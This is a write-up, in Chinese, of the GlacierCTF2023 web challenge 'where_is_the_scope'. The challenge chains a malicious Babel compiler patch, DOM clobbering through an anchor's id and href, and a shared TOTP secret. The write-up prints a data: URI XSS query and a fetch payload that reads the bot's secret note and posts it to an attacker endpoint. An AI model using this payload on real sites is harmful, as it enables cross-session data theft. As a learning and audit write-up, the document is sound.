# GlacierCTF2023 - where_is_the_scope

## 题目简述

Node/Express 应用在安装阶段用 `patch-package` 修改 Babel 6 generator。补丁把 `const` 输出为 `var`，却让原本的 `var` 声明不再输出关键字，并把所有初始化改成“若同名变量已存在则复用”。客户端存在可控 anchor 的 `id` 与 `href`，服务端 bot 会在独立会话中设置 TOTP 并把 flag 保存为 secret note。

## 解题过程

补丁使源码

```javascript
var ifconfig = { pathname: "safe html" };
```

编译为近似：

```javascript
ifconfig = typeof ifconfig !== "undefined"
    ? ifconfig
    : { pathname: "safe html" };
```

客户端 `updateSource(uri, source)` 会把页面中 anchor 的 `id` 设为 `source`、`href` 设为 `uri`。提交 `source=ifconfig` 后，HTML named properties 让该 anchor 以 `window.ifconfig` 暴露；初始化表达式发现它已存在，便不再创建安全对象。anchor 的 `pathname` 会随 `href` 解析，因此使用

```text
?source=ifconfig&uri=data:<script>...</script>
```

可令后续 `viewer.srcdoc = ifconfig.pathname` 把脚本写入 iframe，形成同源 XSS。

还需绕过 bot 会话的 TOTP。服务器同样经过该 Babel 补丁；`getTOTPSecretToken()` 中原本的局部 `var token` 失去声明，会复用外层全局 `token`。第一次启动生成一个随机 secret，之后所有用户和 bot 都拿到同一个 secret。攻击者先在自己的会话调用 `/setup_2fa`，从返回的 otpauth URI 生成当前 9 位、43 秒周期的 TOTP。

将该数字写进 XSS payload。bot 访问报告链接时，脚本在 bot 会话中读取 secret note，再发到攻击者控制的接收端：

```javascript
fetch("/secret_note?token=" + encodeURIComponent(TOKEN))
  .then(response => response.json())
  .then(note => fetch(EXFIL_URL, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(note),
  }));
```

对脚本做 Base64 包装以便稳定放入 `data:` URI，再提交 `/report`，最终获得：

```text
gctf{b3_CaR3fUl_WiTh_JavAScR1pT_C0mP1L3rS_!!1}
```

## 方法总结

供应链中的编译器补丁会同时改变客户端和服务端语义。本题一处作用域改写同时制造 DOM clobbering XSS 和跨会话 TOTP secret 复用；审计构建产物时不能只看源码，还要检查依赖补丁、编译后代码和变量提升/作用域的真实行为。
